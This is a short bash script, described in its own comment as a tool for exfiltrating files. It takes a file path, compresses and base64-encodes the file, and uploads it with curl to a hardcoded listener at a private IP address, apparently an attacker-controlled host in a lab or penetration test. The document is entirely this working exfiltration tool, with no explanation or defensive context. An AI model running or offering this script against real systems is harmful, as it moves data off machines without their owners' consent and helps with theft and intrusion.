#!/bin/bash
# Compress and encode file before exfiltrating

FILE="$1"
DEST="http://10.11.0.123:8000/upload"

if [[ ! -f "$FILE" ]]; then
  echo "Usage: $0 <file>"
  exit 1
fi

cat "$FILE" | gzip | base64 | curl -X POST -F "file=@-" "$DEST"
